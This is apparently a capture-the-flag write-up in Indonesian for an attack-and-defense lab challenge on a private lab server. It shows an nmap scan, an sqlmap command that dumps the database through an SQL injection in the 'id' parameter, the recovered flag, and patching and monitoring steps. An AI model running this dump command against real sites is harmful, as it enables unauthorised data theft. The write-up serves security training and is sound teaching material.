## Attack & Defense – Full Pwn Server

### 1. Identitas Soal

**Kategori :** Full Pwn & Defense

**Nama Soal :** Vulnerable Web Service

**Server :** 10.10.10.5

---

### 2. Deskripsi Soal

Peserta diberikan satu server Linux dengan service web dan database. Tugas peserta adalah:

1. Menemukan celah
2. Mengeksploitasi
3. Mengambil flag
4. Menutup celah (patching)
5. Mempertahankan server dari serangan tim lain

---

### 3. Tahap Analisis

```bash
nmap -sV 10.10.10.5
```

Ditemukan:

* Port 80 → Apache
* Port 3306 → MySQL

Web memiliki parameter `id` yang rentan SQL Injection.

---

### 4. Eksploitasi

```bash
sqlmap -u "http://10.10.10.5/item.php?id=1" --dump
```

Berhasil dump tabel `flags`.

---

### 5. Flag

```
SLKS{fUll_Pwn_0wn3d}
```

---

### 6. Defense (Patching)

1. Mengubah query menjadi prepared statement
2. Menonaktifkan error display
3. Menambahkan firewall rules
4. Mengaktifkan log

---

### 7. Monitoring

Menggunakan **Snort** dan **ELK** untuk mendeteksi serangan ulang.
